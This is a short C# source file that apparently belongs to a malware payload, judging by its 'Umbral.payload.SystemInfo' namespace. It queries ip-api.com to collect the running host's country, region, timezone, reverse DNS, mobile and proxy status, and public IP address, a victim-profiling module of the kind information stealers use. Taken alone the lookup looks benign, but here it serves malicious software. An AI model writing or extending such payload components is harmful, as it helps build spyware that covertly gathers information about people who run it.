using System.Net.Http;
using System.Threading.Tasks;

namespace Umbral.payload.SystemInfo
{
    internal class IpFormat
    {
        public string Country { get; set; }
        public string RegionName { get; set; }
        public string Timezone { get; set; }
        public string Reverse { get; set; }
        public bool Mobile { get; set; }
        public bool Proxy { get; set; }
        public string Query { get; set; }
    }

    internal static class IpInfo
    {
        internal static async Task<IpFormat> GetInfo()
        {
            using (var client = new HttpClient())
            {
                string content = await client.GetStringAsync("http://ip-api.com/json/?fields=225545");
                dynamic jsonContent = SimpleJson.DeserializeObject(content);

                IpFormat ipinfo = new IpFormat
                {
                    Country = (string)jsonContent["country"],
                    RegionName = (string)jsonContent["regionName"],
                    Timezone = (string)jsonContent["timezone"],
                    Reverse = (string)jsonContent["reverse"],
                    Mobile = (bool)jsonContent["mobile"],
                    Proxy = (bool)jsonContent["proxy"],
                    Query = (string)jsonContent["query"]
                };

                return ipinfo;
            }
        }
    }
}